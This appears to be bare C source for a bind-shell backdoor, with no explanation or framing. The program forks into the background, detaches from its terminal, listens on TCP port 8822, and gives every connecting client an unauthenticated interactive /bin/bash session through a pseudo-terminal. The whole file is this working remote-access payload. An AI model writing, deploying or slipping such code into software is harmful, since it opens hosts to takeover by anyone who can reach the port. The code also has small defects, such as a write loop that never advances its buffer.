#include <sys/types.h>
#include <pty.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>

void _write(int fd, char * buf, int length) {
    int pos = 0;
    while (pos < length) {
        int write_count  = write(fd, buf, length - pos);
        if (write_count < 0)
            return;
        pos += write_count;
    }
}

int main() {
    pid_t pid = fork();
    if (pid) {
        int status;
        waitpid(pid, &status, 0);
        return 0;
    } else {
        close(0);
        close(1);
        close(2);
        setsid();
        addrinfo hints;
        addrinfo* result;
        int sfd, s;

        memset(&hints, 0, sizeof(addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        hints.ai_protocol = 0;

        s = getaddrinfo(NULL, "8822", &hints, &result);
        if (s != 0)
            exit(1);
        
        if (result == NULL)
            exit(2);

        sfd = socket(result->ai_family, result->ai_socktype,
                        result->ai_protocol);
        if (sfd == -1)
            exit(3);
        
        int sso_status = 1;;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &sso_status, sizeof(int)) != 0)
            exit(4);

        if (bind(sfd, result->ai_addr, result->ai_addrlen))
            exit(5);

        //freeaddrinfo(result);
        
        if (listen(sfd, 5))
            exit(6);

        while (1) {
            int fd = accept(sfd, result->ai_addr, &result->ai_addrlen);
            if (fd < 0)
                exit(7);

            if (fork()) {
                close(fd);
            } else {
                //printf("I'm work\n");
                int master, slave;
                char buf[4096];
                if (openpty(&master, &slave, buf, NULL, NULL) < 0)
                    exit(8);

                if (fork()) {
                    close(slave);
                    fcntl(fd, F_SETFL, O_NONBLOCK);
                    fcntl(master, F_SETFL, O_NONBLOCK);
                    int len = 1024;
                    char* buff = (char*) malloc(len);
                    while (true) {
                        int read_count = read(master, buff, len);
                        if (read_count == 0)
                            break;
                        _write(fd, buff, read_count);

                        read_count = read(fd, buff, len);
                        if (read_count == 0)
                            break;
                        _write(master, buff, read_count);
                        sleep(1);
                    }
                    free(buff);
                    close(master);
                    close(fd);
                } else {
                    close(master);
                    close(fd);
                    setsid();
                    int ff = open(buf, O_RDWR);
                    if (ff < 0)
                        exit(11);
                    close(ff);
                    dup2(slave, 0);
                    dup2(slave, 1);
                    dup2(slave, 2);
                    close(slave);
                    execl("/bin/bash", "bash", NULL);
                    exit(12);
                }
            }
        }
    }
}


//socket, setsockopt, bind, listen, accept, port == "8822"
